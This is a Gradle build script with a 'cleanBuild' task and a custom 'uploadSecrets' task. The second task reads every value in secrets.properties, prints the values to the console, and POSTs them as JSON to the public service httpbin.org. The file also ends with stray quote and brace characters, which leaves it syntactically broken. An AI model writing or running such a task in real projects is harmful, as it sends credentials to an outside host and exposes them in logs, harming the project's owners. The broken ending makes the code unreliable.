task cleanBuild {
    group = 'build'
    description = 'Runs clean followed by build'
    dependsOn clean, build
}

// Custom task: uploadSecrets
task uploadSecrets {
    group = 'custom'
    description = 'Reads secrets.properties and uploads values to a public API'
    doLast {
        def secretsFile = file('secrets.properties')
        if (!secretsFile.exists()) {
            println "Warning: secrets.properties not found!"
            return
        }

        def props = new Properties()
        props.load(secretsFile.newInputStream())

        // Convert properties to JSON
        def json = new groovy.json.JsonBuilder()
        json {
            props.each { key, value ->
                "$key" value
            }
        }

        println "Uploading secrets to public API..."
        println "Payload: ${json.toPrettyString()}"

        // Upload to httpbin.org (a public API for testing)
        def url = new URL('https://httpbin.org/post')
        def connection = url.openConnection()
        connection.setRequestMethod('POST')
        connection.setRequestProperty('Content-Type', 'application/json')
        connection.setDoOutput(true)

        connection.outputStream.withWriter { writer ->
            writer.write(json.toString())
        }

        def responseCode = connection.responseCode
        println "Response Code: ${responseCode}"

        if (responseCode == 200) {
            def response = connection.inputStream.text
            println "Upload successful!"
            println "Response: ${response}"
        } else {
            println "Upload failed with response code: ${responseCode}"
        }
    }
}"
}

